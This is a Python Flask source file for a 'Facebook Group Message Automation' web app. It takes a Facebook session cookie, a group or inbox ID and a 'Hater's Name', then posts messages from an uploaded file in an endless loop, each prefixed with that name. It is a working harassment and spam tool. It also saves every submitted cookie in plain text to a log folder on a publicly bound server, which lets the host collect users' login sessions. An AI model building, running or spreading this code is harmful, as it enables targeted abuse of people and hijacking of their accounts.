from flask import Flask, request, render_template_string, redirect, url_for
import requests
import threading
import time
import os

app = Flask(__name__)

# Global variable to control the loop
running = False


@app.route('/', methods=['GET', 'POST'])
def index():
    global running
    if request.method == 'POST':
        # Retrieve form inputs
        group_id = request.form.get('groupId')
        cookie = request.form.get('cookie')
        hater_name = request.form.get('haterName')
        delay = int(request.form.get('delay'))

        # Read the uploaded message file
        message_file = request.files['messageFile']
        messages = message_file.read().decode().splitlines()

        # Create a folder for logs
        folder_name = f"Logs_Group_{group_id}"
        os.makedirs(folder_name, exist_ok=True)

        # Save data to logs
        with open(os.path.join(folder_name, "cookie.txt"), "w") as f:
            f.write(cookie)
        with open(os.path.join(folder_name, "messages.txt"), "w") as f:
            f.write("\n".join(messages))

        # Start the message-sending thread
        running = True
        threading.Thread(target=send_messages, args=(group_id, cookie, hater_name, delay, messages)).start()
        return redirect(url_for('index'))

    elif request.args.get('stop') == '1':
        running = False
        return redirect(url_for('index'))

    # HTML template for the webpage
    return render_template_string('''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Facebook Automation</title>
            <style>
                body {
                    background: rgb(0,0,0);
                    background: radial-gradient(circle, red, green, blue, yellow);
                    animation: bg-animation 5s infinite;
                    color: white;
                    font-family: Arial, sans-serif;
                }
                @keyframes bg-animation {
                    0% { background-position: 0% 50%; }
                    50% { background-position: 100% 50%; }
                    100% { background-position: 0% 50%; }
                }
                .container {
                    max-width: 600px;
                    margin: 50px auto;
                    padding: 20px;
                    border-radius: 10px;
                    background: rgba(0, 0, 0, 0.8);
                    box-shadow: 0 0 15px white;
                }
                .form-control {
                    width: 100%;
                    margin-bottom: 15px;
                    padding: 10px;
                    border-radius: 5px;
                    border: 1px solid white;
                    background: transparent;
                    color: white;
                }
                .btn {
                    display: inline-block;
                    padding: 10px 20px;
                    background: green;
                    color: white;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                }
                .btn:hover {
                    background: red;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Facebook Group Message Automation</h1>
                <form method="POST" enctype="multipart/form-data">
                    <label for="groupId">Group/Inbox ID:</label>
                    <input type="text" id="groupId" name="groupId" class="form-control" required>
                    
                    <label for="cookie">Facebook Cookie:</label>
                    <input type="text" id="cookie" name="cookie" class="form-control" required>
                    
                    <label for="haterName">Hater's Name:</label>
                    <input type="text" id="haterName" name="haterName" class="form-control" required>
                    
                    <label for="messageFile">Messages (TXT File):</label>
                    <input type="file" id="messageFile" name="messageFile" class="form-control" accept=".txt" required>
                    
                    <label for="delay">Delay (seconds):</label>
                    <input type="number" id="delay" name="delay" class="form-control" value="5" required>
                    
                    <button type="submit" class="btn">Start</button>
                    <a href="?stop=1" class="btn">Stop</a>
                </form>
            </div>
        </body>
        </html>
    ''')


def send_messages(group_id, cookie, hater_name, delay, messages):
    global running
    headers = {
        'Connection': 'keep-alive',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
        'Content-Type': 'application/json',
        'Cookie': cookie
    }

    post_url = f"https://graph.facebook.com/v15.0/{group_id}/messages"
    message_index = 0

    while running:
        try:
            message = f"{hater_name} {messages[message_index % len(messages)]}"
            payload = {
                'message': message
            }

            response = requests.post(post_url, json=payload, headers=headers)

            if response.ok:
                print(f"[+] Message sent: {message}")
            else:
                print(f"[x] Failed to send message: {response.text}")

            message_index += 1
            time.sleep(delay)
        except Exception as e:
            print(f"[!] Error: {e}")
            time.sleep(5)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
        
